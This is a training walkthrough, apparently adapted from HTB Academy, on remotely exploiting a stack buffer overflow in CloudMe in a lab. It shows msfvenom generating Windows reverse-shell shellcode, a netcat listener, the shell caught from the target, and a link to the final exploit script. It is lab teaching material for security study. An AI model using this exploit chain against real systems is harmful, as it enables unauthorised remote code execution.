As we have built and tested our exploit, we can now try running it on a real remote server. We can use the same exploit on the real target, and we only need to change the `IP` and `port` in our script to aim it at the new target and change the shellcode we use within the script to something that will send us a reverse shell.

---

## Reverse Shell Shellcode

First, we need to find our machine's IP, which should be reachable by the remote server (in the same network subnet):

  Remote Exploitation

```shell-session
frodonomojo@htb[/htb]$ ip -4 a

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...SNIP...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    ...SNIP...
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    inet 10.10.15.10/23 brd 10.10.15.255 scope global tun0
```

The IP we will use is `tun0`'s IP, as our VM is on the same `10.10.` subnet.

Note: You need to be connected to the VPN to be able to interact with the remote server, so download the VPN key in case you want to run the exploit from your own machine. The PwnBox instance is already connected to the VPN, so you should be able to connect to the remote server.

Next, we will generate the shellcode that will send us a reverse shell, which we can get with the `windows/shell_reverse_tcp` payload in `msfvenom`, as follows:

  Remote Exploitation

```shell-session
frodonomojo@htb[/htb]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.10 LPORT=1234 -f 'python'

...SNIP...
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
...SNIP...
```

We can modify our exploit by copying the output and using it in the `exploit()` function for the `buf` variable.

---

## Remote Exploitation

After that, we can start a `netcat` listener to receive the reverse shell, as follows:

  Remote Exploitation

```shell-session
frodonomojo@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Once we are listening, we can run our payload with `python win32bof_exploit_remote.py` and wait for the remote server to send us a reverse shell if our exploitation was successful.

  Remote Exploitation

```shell-session
frodonomojo@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.15.10] from (UNKNOWN) [10.10.10.10] 64539
Microsoft Windows [Version 10.0.19042.928]
(c) Microsoft Corporation. All rights reserved.

C:\Users\htb-student\AppData\Local\Programs\CloudMe\CloudMe>whoami
whoami
htb-student
```

As we can see, without having local access to the remote server, we successfully exploited the remote service and received a reverse shell. This shows us that if we properly debug the program, we can build and test our exploit locally, then run it on any remote server with the vulnerable program listening for remote connections.

You can download the final exploit code from the following link. Don't forget to rename it from `.txt` to `.py`.

[Download win32bof_exploit_remote_py.txt here](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_remote_py.txt)

**Credit:** This information was adapted from an excellent guide on [HTB Academy](https://academy.hackthebox.com/course/preview/stack-based-buffer-overflows-on-windows-x86). Be sure to check out the original post for more details.

